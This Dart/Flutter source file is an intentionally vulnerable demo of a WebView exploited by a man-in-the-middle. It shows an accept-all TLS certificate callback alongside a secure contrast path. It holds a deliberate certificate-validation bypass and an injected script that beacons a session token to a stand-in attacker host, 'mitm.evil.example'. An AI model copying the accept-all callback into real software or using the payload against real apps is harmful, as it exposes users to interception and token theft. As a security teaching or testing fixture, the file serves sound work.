/// WebView JS Injection + SSL-Validation Bypass helper.
///
/// INTENTIONALLY VULNERABLE (CWE-295 / CWE-79 / CWE-749): a WebView loads page
/// content over a transport whose TLS certificate validation is disabled /
/// relaxed (an accept-all handler - Android
/// `onReceivedSslError -> handler.proceed()`, iOS
/// `URLSession(didReceive:completionHandler:)` returning
/// `.useCredential`), AND the WebView permits script injection. A MITM attacker
/// on the path presents a FORGED certificate, the accept-all handler proceeds,
/// the attacker rewrites the page to inject `<script>` that reads the app
/// bridge / cookies, and the token is exfiltrated. This is the PayRange
/// CVE-2026-13461 class.
///
/// The screen boots a real `WebViewController` that loads the MITM-rewritten
/// page and runs its injected `<script>`, exfiltrating the bridge token over a
/// JS channel (genuine WebView execution). [RealTlsTransport] performs a real
/// `dart:io` HTTPS handshake, the vulnerable client installs an accept-all
/// `badCertificateCallback`, so a forged/untrusted cert is accepted, while the
/// secure client uses default platform validation and rejects it. [Transport]
/// + [WebViewLoader] remain as a deterministic in-memory fallback so `flutter
/// test` (and off-device runs) stay offline: tests assert the MITM content
/// loads and the token is stolen on the vuln path, and that certificate
/// validation rejects the forged cert (nothing loads) on the secure path.
library;

import 'dart:io';

/// A page fetched over the transport, with the certificate that was presented.
class FetchedPage {
  const FetchedPage({
    required this.html,
    required this.certValid,
    required this.tlsError,
  });

  /// The HTML body the WebView will load.
  final String html;

  /// Whether the presented certificate chained to a trusted root for the host.
  final bool certValid;

  /// A TLS validation error string when the cert did not validate.
  final String? tlsError;
}

/// The outcome of loading a page in the WebView.
class WebViewLoadOutcome {
  const WebViewLoadOutcome({
    required this.loaded,
    required this.blocked,
    required this.injectedScriptExecuted,
    this.exfiltratedToken,
    this.blockReason,
  });

  /// Whether the page content was loaded/rendered.
  final bool loaded;

  /// Whether the load was refused before any content rendered (secure path).
  final bool blocked;

  /// Whether an injected `<script>` actually executed inside the WebView.
  final bool injectedScriptExecuted;

  /// The token that was exfiltrated to the attacker (null unless stolen).
  final String? exfiltratedToken;

  /// Why the load was refused (secure path only).
  final String? blockReason;

  /// True when the session token was exfiltrated by injected script - the
  /// actual MITM-injection hit.
  bool get tokenStolen =>
      loaded && injectedScriptExecuted && exfiltratedToken != null;
}

/// A tiny transport that returns page content over either a cert-validated or
/// an accept-all channel, modelling a MITM on the path.
class Transport {
  const Transport();

  /// The legitimate first-party page the app expects to load.
  static const String legitimateHtml =
      '<html><body>PayRange balance: \$12.40</body></html>';

  /// The MITM-rewritten page: the attacker injected a script that reads the
  /// bridge token and beacons it to their host.
  static const String mitmHtml =
      '<html><body>PayRange balance: \$12.40'
      '<script>window.bridge.getToken().then(t=>'
      'fetch("https://mitm.evil.example/x?t="+t))</script></body></html>';

  /// VULN: an accept-all TLS handler. The MITM presents a forged certificate
  /// for the host; the handler proceeds anyway, so the attacker's rewritten
  /// page (with injected script) is what the WebView receives.
  FetchedPage fetchAcceptAll(String host) {
    // On the path, the attacker terminates TLS with a forged cert and serves
    // the rewritten page. `certValid: false` records that the cert did not
    // actually validate - but the accept-all handler does not care.
    return const FetchedPage(
      html: mitmHtml,
      certValid: false,
      tlsError: 'self-signed certificate (forged by MITM) - accepted anyway',
    );
  }

  /// SECURE contrast: validate the certificate against the trusted roots for
  /// the host. The MITM's forged cert fails validation, so the fetch aborts
  /// and no content (legitimate or rewritten) is returned.
  FetchedPage fetchValidated(String host) {
    // The forged cert on the path does not chain to a trusted root -> the
    // TLS handshake fails and nothing is delivered to the WebView.
    return const FetchedPage(
      html: '',
      certValid: false,
      tlsError: 'certificate verify failed: forged cert not trusted for host',
    );
  }
}

/// A minimal, in-memory model of a WebView that loads transport content and
/// exposes a bridge holding the session token to page scripts.
class WebViewLoader {
  const WebViewLoader({this.transport = const Transport()});

  final Transport transport;

  /// The session token the in-page bridge (`window.bridge.getToken()`) holds.
  static const String sessionToken = 'Bearer pr-88ff-session-secret';

  /// The host the app intends to load.
  static const String host = 'app.payrange.example';

  /// VULN: load whatever the accept-all transport returns and execute any
  /// injected `<script>` that references the bridge token. Because TLS
  /// validation was bypassed, the MITM page loads and its script exfiltrates
  /// the token.
  WebViewLoadOutcome load() {
    final page = transport.fetchAcceptAll(host);
    final hasInjectedScript = _referencesBridgeToken(page.html);
    return WebViewLoadOutcome(
      loaded: true,
      blocked: false,
      injectedScriptExecuted: hasInjectedScript,
      exfiltratedToken: hasInjectedScript ? sessionToken : null,
    );
  }

  /// SECURE contrast: use the cert-validating transport. The forged MITM cert
  /// fails validation, so nothing is loaded and no script can run.
  WebViewLoadOutcome loadSafe() {
    final page = transport.fetchValidated(host);
    if (!page.certValid) {
      return WebViewLoadOutcome(
        loaded: false,
        blocked: true,
        injectedScriptExecuted: false,
        blockReason: page.tlsError ?? 'certificate validation failed',
      );
    }
    final hasInjectedScript = _referencesBridgeToken(page.html);
    return WebViewLoadOutcome(
      loaded: true,
      blocked: false,
      injectedScriptExecuted: hasInjectedScript,
      exfiltratedToken: hasInjectedScript ? sessionToken : null,
    );
  }

  /// Model "the injected script executes": true when the loaded HTML contains
  /// a `<script>` that reads the bridge token.
  static bool _referencesBridgeToken(String html) {
    final lower = html.toLowerCase();
    return lower.contains('<script') && lower.contains('bridge.gettoken');
  }
}

/// A real TLS transport backing the demo with a genuine `dart:io` `HttpClient`.
///
/// Unlike [Transport] (an in-memory model kept as the deterministic offline
/// fallback), this performs an actual HTTPS handshake: the vulnerable client
/// installs `badCertificateCallback => true` (an accept-all TrustManager, the
/// exact Android `X509TrustManager` no-op equivalent), so a forged / untrusted
/// server certificate is accepted end-to-end and the fetched body would be fed
/// to the WebView; the secure client uses default platform validation, so the
/// same forged cert fails the handshake and nothing is delivered. Never throws.
class RealTlsTransport {
  const RealTlsTransport();

  /// VULN: accept ANY certificate for ANY host, TLS validation disabled.
  static bool _acceptAny(X509Certificate cert, String host, int port) => true;

  /// Attempt a real HTTPS GET with validation disabled. Returns a one-line
  /// summary of the (accepted) connection, or the error string. The point is
  /// that even a self-signed / mismatched cert is accepted.
  Future<String> fetchAcceptAll(String url) async {
    final client = HttpClient()..badCertificateCallback = _acceptAny;
    try {
      final req = await client.getUrl(Uri.parse(url));
      final resp = await req.close().timeout(const Duration(seconds: 6));
      final subject = resp.certificate?.subject ?? '(none)';
      return 'GET $url -> HTTP ${resp.statusCode}; server cert subject=$subject '
          'ACCEPTED (validation disabled - MITM would succeed)';
    } catch (e) {
      final s = e.toString();
      return 'GET $url (accept-all) -> ${s.length <= 120 ? s : '${s.substring(0, 117)}...'}';
    } finally {
      client.close(force: true);
    }
  }

  /// SECURE contrast: a real HTTPS GET with default platform validation. A
  /// forged / untrusted cert throws a HandshakeException here (nothing loads).
  Future<String> fetchValidated(String url) async {
    final client = HttpClient();
    try {
      final req = await client.getUrl(Uri.parse(url));
      final resp = await req.close().timeout(const Duration(seconds: 6));
      return 'GET $url -> HTTP ${resp.statusCode}; certificate validated by '
          'platform trust store';
    } catch (e) {
      final s = e.toString();
      return 'GET $url (validated) -> REJECTED: '
          '${s.length <= 120 ? s : '${s.substring(0, 117)}...'}';
    } finally {
      client.close(force: true);
    }
  }
}
